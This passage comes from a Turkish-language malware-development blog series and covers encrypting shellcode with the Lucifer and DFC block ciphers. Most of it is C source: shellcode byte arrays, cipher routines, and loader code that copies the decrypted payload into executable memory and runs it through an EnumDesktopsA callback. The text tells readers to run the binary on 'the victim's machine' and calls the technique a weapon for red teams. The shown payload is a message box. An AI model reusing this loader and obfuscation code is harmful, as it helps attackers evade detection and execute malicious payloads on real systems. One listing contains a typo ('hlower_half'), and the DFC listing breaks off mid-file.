step) % step_count]) & m1[7]) | (lower_half[(4 + step) % step_count] &
m2[7]);

if (step < step_count - 1 || decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
		}
	   } 

// swap halves
for (int i = 0; i < block_size / 2; ++i) {
	swap(&lower_half[i], &upper_half[i]);
}
	}
// physically swap halves
for (int i = 0; i < block_size / 2; ++i) {
swap(&block[i], &block[i + block_size / 2]);
}
}

int main() {
char message[block_size + 1] = "meowmeowmeowmeow"; // 16 characters + null

// terminator
char key[key_size] = "abcdefghijklmnop"; // example 128-bit key
message[block_size] = '\0'; // add a null terminator at the end of the

// message
printf("original block: %s\n", message);
Lucifer(message, key, false); // encrypt
printf("encrypted block: ");
for (int i = 0; i < block_size; i++) {
	printf("%02x ", (unsigned char)message[i]);
}
printf("\n");

Lucifer(message, key, true); // decrypt
printf("decrypted block: %s\n", message);
return 0;
}
Gördüğünüz gibi, ana fonksiyonda yalnızca meowmeowmeowmeow mesajını şifreledim.
demo 1

Bu kodun nasıl çalıştığını görelim. Linux için derleyin:
gcc hack.c -o hack
+++++++++++++++++++++++++++++++++++++++++++++++
Sonra çalıştıralım:
 ./hack
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, bu durumda her şey mükemmel çalıştı.
pratik örnek 2

Şimdi, farklı bir mantıkla uygulayalım: şifrele / şifre çöz ve çalıştır.


Bu kodun kaynak kodu, ilk örnektekine benzer; tek fark, iki yeni fonksiyon eklenmiş olmasıdır:
// payload encryption function
void lucifer_encrypt_payload(unsigned char* payload, int payload_len,
unsigned char* key) {
for (int i = 0; i < payload_len / block_size; i++) {
	Lucifer((char*)(payload + i * block_size), (char*)key, false);
}
}

// payload decryption function
void lucifer_decrypt_payload(unsigned char* payload, int payload_len,
unsigned char* key) {
for (int i = 0; i < payload_len / block_size; i++) {
	Lucifer((char*)(payload + i * block_size), (char*)key, true);
}
}
Bu sürüm, Lucifer şifreleyicisini doğru bir şekilde hack.c fonksiyonunu kullanarak uygular ve şifreleme/şifre çözme sürecini payload bloklarına uygular.
Lucifer fonksiyonu, lucifer_encrypt_payload ve lucifer_decrypt_payload içinde entegre edilmiştir ve doğru şifreleme akışını garanti eder.


Tam kaynak kodu şu şekildedir (hack2.c):
/*
* hack.c
* Lucifer payload encryption/decryption
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/10/20/malware-cryptography-33.html
*/
#include <stdio.h>
#include <stdbool.h>
#include <string.h>

#define block_size 16 // 128 bit
#define key_size 16 // 128 bit

static const unsigned char s0[16] = {
0x0C, 0x0F, 0x07, 0x0A, 0x0E, 0x0D, 0x0B, 0x00,
0x02, 0x06, 0x03, 0x01, 0x09, 0x04, 0x05, 0x08
};
static const unsigned char s1[16] = {
	0x07, 0x02, 0x0E, 0x09, 0x03, 0x0B, 0x00, 0x04,
	0x0C, 0x0D, 0x01, 0x0A, 0x06, 0x0F, 0x08, 0x05
};
static const unsigned char m1[8] = {
	0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01
};
static const unsigned char m2[8] = {
	0x7F, 0xBF, 0xDF, 0xEF, 0xF7, 0xFB, 0xFD, 0xFE
};

#define shift_left(x, n) ((x) << (n))
#define shift_right(x, n) ((unsigned char)(x) >> (n))
#define highsubbyte(x) shift_right((x), 4)
#define lowsubbyte(x) ((x) & 0x0F)

void swap(char* arg1, char* arg2) {
	char tmp = *arg1;
	*arg1 = *arg2;
	*arg2 = tmp;
}

void Lucifer(char block[block_size], char key[key_size], bool decrypt) {
char* lower_half = block;
char* upper_half = block + block_size / 2;
int key_byte_idx = decrypt ? 8 : 0;
const int round_count = 16;
for (int round = 0; round < round_count; ++round) {
if (decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
}

int transform_control_byte_idx = key_byte_idx;
const int step_count = 8;

for (int step = 0; step < step_count; ++step) {
char message_byte = upper_half[step];

// confusion
if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0
[lowsubbyte(message_byte)];
} else {
message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1
[lowsubbyte(message_byte)];
}

// key interruption
message_byte ^= key[key_byte_idx];

// permutation
message_byte =      (shift_right(message_byte & m1[0], 3)) |
(shift_right(message_byte & m1[1], 4)) |
(shift_left(message_byte & m1[2], 2)) |
(shift_right(message_byte & m1[3], 1)) |
(shift_left(message_byte & m1[4], 2)) |
(shift_left(message_byte & m1[5], 4)) |
(shift_right(message_byte & m1[6], 1)) |
(shift_left(message_byte & m1[7], 1));
// diffusion
hlower_half[(7 + step) % step_count] = ((message_byte ^ lower_half[(7 +
step) % step_count]) & m1[0]) | (lower_half[(7 + step) % step_count] &
m2[0]);
lower_half[(6 + step) % step_count] = ((message_byte ^ lower_half[(6 +
step) % step_count]) & m1[1]) | (lower_half[(6 + step) % step_count] &
m2[1]);
lower_half[(2 + step) % step_count] = ((message_byte ^ lower_half[(2 +
step) % step_count]) & m1[2]) | (lower_half[(2 + step) % step_count] &
m2[2]);
lower_half[(1 + step) % step_count] = ((message_byte ^ lower_half[(1 +
step) % step_count]) & m1[3]) | (lower_half[(1 + step) % step_count] &
m2[3]);
lower_half[(5 + step) % step_count] = ((message_byte ^ lower_half[(5 +
step) % step_count]) & m1[4]) | (lower_half[(5 + step) % step_count] &
m2[4]);
lower_half[(0 + step) % step_count] = ((message_byte ^ lower_half[(0 +
step) % step_count]) & m1[5]) | (lower_half[(0 + step) % step_count] &
m2[5]);
lower_half[(3 + step) % step_count] = ((message_byte ^ lower_half[(3 +
step) % step_count]) & m1[6]) | (lower_half[(3 + step) % step_count] &
m2[6]);
lower_half[(4 + step) % step_count] = ((message_byte ^ lower_half[(4 +
step) % step_count]) & m1[7]) | (lower_half[(4 + step) % step_count] &
m2[7]);

if (step < step_count - 1 || decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
		}
	   } 

// swap halves
for (int i = 0; i < block_size / 2; ++i) {
	swap(&lower_half[i], &upper_half[i]);
}
	}
// physically swap halves
for (int i = 0; i < block_size / 2; ++i) {
swap(&block[i], &block[i + block_size / 2]);
}
}

// payload encryption function
void lucifer_encrypt_payload(unsigned char* payload, int payload_len,
unsigned char* key) {
for (int i = 0; i < payload_len / block_size; i++) {
	Lucifer((char*)(payload + i * block_size), (char*)key, false);
}
}

// payload decryption function
void lucifer_decrypt_payload(unsigned char* payload, int payload_len,
unsigned char* key) {
for (int i = 0; i < payload_len / block_size; i++) {
	Lucifer((char*)(payload + i * block_size), (char*)key, true);
}
}


int main() {
	unsigned char key[16] = "meowmeowbowwoow"; // example 128-bit key
unsigned char my_payload[] = {
0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x0, 0x0,
0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0xf, 0xb7, 0x4a,
0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2,
0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52,
0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
0x1, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0,
0x74, 0x6f, 0x48, 0x1, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75,
0xf1, 0x3e, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd6,
0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x3e, 0x41,
0x8b, 0xc, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x3e,
0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x0, 0x0, 0x0,
0x0, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x0, 0x0, 0x0, 0x3e, 0x4c, 0x8d,
0x85, 0x9, 0x1, 0x0, 0x0, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
0x56, 0x7, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
0x56, 0xff, 0xd5, 0x4d, 0x65, 0x6f, 0x77, 0x2d, 0x6d, 0x65, 0x6f, 0x77,
0x21, 0x0, 0x3d, 0x5e, 0x2e, 0x2e, 0x5e, 0x3d, 0x0
};

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len + (block_size - my_payload_len % block_size) %
block_size;

unsigned char padded[pad_len];
memset(padded, 0x90, pad_len); // pad with NOPs (0x90)
memcpy(padded, my_payload, my_payload_len);

printf("original payload: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

// encrypt the payload
lucifer_encrypt_payload(padded, pad_len, key);

printf("encrypted payload: ");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

// decrypt the payload
lucifer_decrypt_payload(padded, pad_len, key);

printf("decrypted payload: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}
Her zamanki gibi, burada meow-meow mesaj kutusu payload kullanılmıştır:
unsigned char my_payload[] = {
0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x0, 0x0,
0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0xf, 0xb7, 0x4a,
0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2,
0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52,
0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
0x1, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0,
0x74, 0x6f, 0x48, 0x1, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75,
0xf1, 0x3e, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd6,
0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x3e, 0x41,
0x8b, 0xc, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x3e,
0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x0, 0x0, 0x0,
0x0, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x0, 0x0, 0x0, 0x3e, 0x4c, 0x8d,
0x85, 0x9, 0x1, 0x0, 0x0, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
0x56, 0x7, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
0x56, 0xff, 0xd5, 0x4d, 0x65, 0x6f, 0x77, 0x2d, 0x6d, 0x65, 0x6f, 0x77,
0x21, 0x0, 0x3d, 0x5e, 0x2e, 0x2e, 0x5e, 0x3d, 0x0
};

Ayrıca, bu kod padding şemasını ve payload uzunluğunu doğru bir şekilde korur.
demo 2

Şimdi her şeyi çalışırken görelim. Linux makinemde derleyelim:
x86_64-w64-mingw32-gcc -O2 hack2.c -o hack2.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++
Sonra, sadece mağdurun makinesinde çalıştırın (benim durumumda Windows 11 x64):
.\hack2.exe
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı!=..=
Shannon entropisini hesaplama:
python3 entropy.py -f hack2.exe
+++++++++++++++++++++++++++++++++++++++++++++++

payload .text bölümümüzde.
Bildiğiniz gibi, araştırmamda ve bu blogdaki birçok şifreleme algoritması Feistel ağlarını kullanmaktadır.
kriptanaliz


Biham ve Shamir (E. Biham ve A. Shamir, “Snefru, Khafre, REDOC–II, LOKI ve Lucifer'in Farklı Kriptanalizi,” Advances in Cryptology—CRYPTO ’91 Proceedings, 1992, s. 156–171 ve E. Biham ve A. Shamir, Data Encryption Standard'ın Farklı Kriptanalizi, Springer–Verlag, 1993) ilk Lucifer sürümünün, 32-bitlik bloklar ve 8 tur kullanarak, farklı kriptanalize karşı hassas olduğunu ve bunun 40 seçilen düz metin ve \( 2^{29} \) adım gerektirdiğini göstermiştir; benzer şekilde, aynı saldırı, 128-bitlik bloklar ve 8 tur ile Lucifer'i tehlikeye atabilir, bunun için 60 seçilen düz metin ve \( 2^{53} \) adım gereklidir. Bir farklı kriptanalitik saldırı, 24 seçilen düz metinle 18 tur, 128-bit Lucifer'i 221 adımda başarıyla tehlikeye atar. 

Umarım bu gönderi, zararlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, mavi takım üyelerine bu ilginç şifreleme tekniği hakkında farkındalık yaratır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.

Malware and cryptography 1
Github’taki kaynak kod
E. Biham and A. Shamir, “Differential Cryptanalysis of Snefru, Khafre, REDOC–II, LOKI,
and Lucifer,” Advances in Cryptology—CRYPTO ’91 Proceedings, 1992, pp. 156–171


97. zararlı yazılım ve kriptografi araştırması - bölüm 6 (34): payload’u DFC algoritmasıyla şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Lüksemburg'da bir konferansta yaptığım sunum ve seminerden sonra, Windows işletim sisteminin iç yapısındaki kriptografik fonksiyonların kötüye kullanımı üzerine değindiğimde, birçok meslektaşım ve okuyucum, kötü amaçlı yazılımların geliştirilmesi sırasında kriptografinin kullanımına dair giderek daha fazla soru sormaya başladı.


Bu yazı, kötü amaçlı yazılım geliştirmede DFC (Decorrelated Fast Cipher) kullanımına ilişkin kendi araştırmamın bir sonucudur. Her zamanki gibi, çeşitli şifreleme algoritmalarını incelerken, bunu payload'u şifrelemek/şifresini çözmek için uygularsak ne olacağını kontrol etmeye karar verdim.
DFC

Decorrelated Fast Cipher (DFC), 1998 yılında École Normale Supérieure, CNRS ve France Telecom’daki kriptograflar tarafından Serge Vaudenay liderliğinde geliştirildi. Gelişmiş Şifreleme Standardı (AES) yarışmasına aday olarak tasarlanan DFC, 8 tur Feistel ağı ve 128 bitlik blok boyutu kullanan simetrik bir blok şifreleme algoritmasıdır. Sonuç olarak AES standardı olarak seçilmese de, DFC özellikle PEANUT şifre ailesi içinde kriptografik araştırmalara katkıda bulundu.
Decorrelated Fast Cipher (DFC), her turda 128 bitlik bir bloğu iki 64 bitlik yarıya bölen 8 turlu bir Feistel ağına dayanır. DFC, değişken uzunlukta bir anahtardan (en fazla 256 bit) 8 benzersiz tur anahtarı oluşturmak için bir anahtar planı kullanır, ancak genellikle 128 bitlik bir anahtarla uygulanır. Her tur, bloğun bir yarısına özel bir şifreleme fonksiyonu uygular, onu diğer yarısıyla birleştirir ve ardından yarıları değiştirir – bu, anahtarların sırasını tersine çevirerek kolayca şifre çözmeyi mümkün kılan klasik bir Feistel yapısıdır.
DFC'nin mimarisi, diferansiyel ve doğrusal kriptoanalize karşı mükemmel güvenlik sağlamayı amaçlar ve modern kriptografik saldırılara karşı direnmek için şifrelenmiş veriler içindeki istatistiksel ilişkileri azaltan dekorrelasyon teorisini kullanmasıyla dikkat çeker. Her turun şifreleme fonksiyonu, ana anahtardan türetilmiş bir çift 64 bitlik alt anahtar kullanır, bu da şifreyi donanım ve yazılım uygulamaları için uygun hale getirir.
DFC, nihai AES standardı olarak seçilmese de, dekorrelasyon tabanlı saldırılara karşı dirençli yeni teknikler sundu ve simetrik blok şifreleri için güçlü güvenlik özelliklerini vurguladı. DFC şu anda, kriptoanalize karşı direncini artırmak için benzersiz matematiksel dönüşümler kullanan PEANUT ailesinin (Pretty Encryption Algorithm with n-Universal Transformation) bir üyesidir.
pratik örnek

Bunu pratikte uygulayalım. DFC tabanlı şifreleme ve şifre çözme fonksiyonlarının nasıl uygulanması gerektiğini anlamak için uygulamayı adım adım inceleyelim ve payload şifrelemeye odaklanalım. Bu yaklaşım, kodun her bölümünü ve DFC şifresinin işlevselliğine nasıl katkıda bulunduğunu anlamanıza yardımcı olacaktır.
Öncelikle sabitleri ve anahtar değişkenleri tanımlayın:
#define ROUNDS 8
#define BLOCK_SIZE 16
Ardından anahtar planı oluşturulmalıdır.
Anahtar planı fonksiyonu, orijinal şifreleme anahtarına dayalı olarak sekiz adet 128 bitlik tur anahtarı üretir. Bu tur anahtarları, Feistel turlarının her birinde veri bloğunun her yarısı üzerinde işlemler gerçekleştirmek için kullanılır:
void key_schedule(uint8_t* key) {
for (int i = 0; i < ROUNDS; i++) {
for (int j = 0; j < 16; j++) {
	K[i][j] = key[j] ^ (i + j);
}
}
}
Tur anahtarları, ana anahtarın her baytının tur ve bayt indeksleri ile XORlanmasıyla türetilir, bu da her tur için benzersiz anahtarlar oluşturur.


Sonraki adım Feistel tur fonksiyonunun uygulanmasıdır. DFC’de her tur, bloğun sol ve sağ yarıları üzerinde işlemler gerçekleştirir. Tur fonksiyonu G, sol ve sağ yarıları ve bir roundKey alır.
Bu fonksiyon: sol ve sağ yarıları değiştirir ve sol yarıyı (F fonksiyonu uygulandıktan sonra) sağ yarı ve geçerli tur anahtarı ile XORlar:
// DFC G function applies Feistel structure in each round
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
uint32_t tempRight = *right;
*right = *left ^ F(*right, *(uint32_t*)roundKey);
*left = tempRight;
}
F, Feistel yapısının çekirdek fonksiyonudur. Kendi uygulamamda, Decorrelated Fast Cipher (DFC) turu için F fonksiyonu, her turda doğrusal olmayanlık ve yayılımı artırmak için bit kaydırma ve XOR işlemleri kullanır:
// function F for DFC round (simplified for illustration)
uint32_t F(uint32_t left, uint32_t key_part) {
	return rotl(left + key_part, 3) ^ key_part;
}
Burada, left parametresi tipik olarak Feistel turundaki veri bloğunun sol yarısıdır, key_part ise her Feistel turuna özgü 32 bitlik bir tur anahtarı parçasıdır.
Bu fonksiyonun temel mantığı basittir.


Sol giriş (veri bloğunun yarısı), key_part ile toplanır. Bu toplama, mevcut veri ve anahtara bağlılığı artırarak her turun belirli tur anahtarına duyarlı olmasını sağlar.


Toplamanın sonucu, 3 bit sola döndürülür (rotl(..., 3)). Bit kaydırma, veriyi yaymak için kullanılır ve yayılımı artırır. Rotl fonksiyonu, bitleri 3 pozisyon sola kaydırır ve en soldaki bitler sağa döner.
Son olarak, kaydırma işleminin sonucu key_part ile XORlanır. XOR, doğrusal olmayanlığı daha da artırır ve key_part veya left'teki küçük değişikliklerin F fonksiyonunun çıktısında büyük değişikliklere neden olmasını sağlar.
Sonraki fonksiyon, blok şifreleme mantığıdır.
dfc_encrypt fonksiyonu, Feistel yapısında 8 tur boyunca şifreleme gerçekleştirir. Her tur, anahtar planından türetilmiş farklı bir tur anahtarı kullanır:
// DFC encryption function
void dfc_encrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of encryption
for (int i = 0; i < ROUNDS; i++) {
	G(&left, &right, K[i]);
}
// final left-right swap
block[0] = right;
block[1] = left;
}
Bu fonksiyon, giriş bloğundan sol ve sağ değişkenleri başlatır. Ardından, 8 tur boyunca G fonksiyonunu sol ve sağ değişkenlere, ilgili tur anahtarı ile birlikte uygular.
Son olarak, sol ve sağ değişkenleri değiştirerek Feistel turunu tamamlar ve bloğu günceller.
Şifre çözme fonksiyonu dfc_decrypt, şifrelemeyi yansıtır, ancak turlar ters sırayla uygulanır:
// DFC decryption function
void dfc_decrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of decryption in reverse
for (int i = ROUNDS - 1; i >= 0; i--) {
	G(&left, &right, K[i]);
}

// final left-right swap
block[0] = right;
block[1] = left;
}
Her zamanki gibi, dfc_encrypt_shellcode, padding uygulayarak ve ardından her 128 bitlik bloğu şifreleyerek shellcode şifrelemeye hazırlar:
// function to encrypt shellcode using DFC
void dfc_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_encrypt(ptr, key);
ptr += 4; // move to the next 128-bit block (4 * 32-bit words)
}
// handle remaining bytes by padding with 0x90 (NOP)
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_encrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}
Bu fonksiyon, key_schedule çağrısı yaparak tur anahtarlarını başlatır. Ardından, ana shellcode'u 128 bitlik bloklar halinde şifreler ve shellcode uzunluğu blok boyutunun katı değilse padding uygular.
Sonraki adım şifre çözme mantığıdır:
// function to decrypt shellcode using DFC
void dfc_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_decrypt(ptr, key);
ptr += 4;
}

// handle remaining bytes by padding
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_decrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}
Son olarak, tümünü birleştirerek main içinde çalıştırıyoruz:
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len +
(BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len); // pad with NOPs
memcpy(padded, my_payload, my_payload_len);
printf("original shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

dfc_encrypt_shellcode(padded, pad_len, key);

printf("encrypted shellcode:\n");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

dfc_decrypt_shellcode(padded, pad_len, key);

printf("decrypted shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

// allocate and execute decrypted shellcode
LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}
Gördüğünüz gibi, main fonksiyonunda sadece meow-meow messagebox payload şifreleyip çözdüm.
Tam kaynak kod hack.c:
/*
* hack.c
* encrypt/decrypt payload via DFC (Decorrelated Fast Cipher) algorithm
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/11/10/malware-cryptography-34.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 8 // DFC uses 8 rounds of encryption
#define BLOCK_SIZE 16 // DFC operates on 128-bit (16-byte) blocks

// subkeys generated from the main key
uint8_t K[ROUNDS][16];

// rotate left function
uint32_t rotl(uint32_t x, int shift) {
	return (x << shift) | (x >> (32 - shift));
}

// function F for DFC round (simplified for illustration)
uint32_t F(uint32_t left, uint32_t key_part) {
	return rotl(left + key_part, 3) ^ key_part;
}
// DFC G function applies Feistel structure in each round
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
uint32_t tempRight = *right;
*right = *left ^ F(*right, *(uint32_t*)roundKey);
*left = tempRight;
}

// key schedule for DFC
void key_schedule(uint8_t* key) {
for (int i = 0; i < ROUNDS; i++) {
for (int j = 0; j < 16; j++) {
	K[i][j] = key[j % 8] ^ (i + j); // generate subkey for each round
}
}
}

// DFC encryption function
void dfc_encrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];
// perform 8 rounds of encryption
for (int i = 0; i < ROUNDS; i++) {
	G(&left, &right, K[i]);
	}
	// final left-right swap
block[0] = right;
block[1] = left;
}

// DFC decryption function
void dfc_decrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of decryption in reverse
for (int i = ROUNDS - 1; i >= 0; i--) {
	G(&left, &right, K[i]);
}

// final left-right swap
block[0] = right;
block[1] = left;
}

// function to encrypt shellcode using DFC
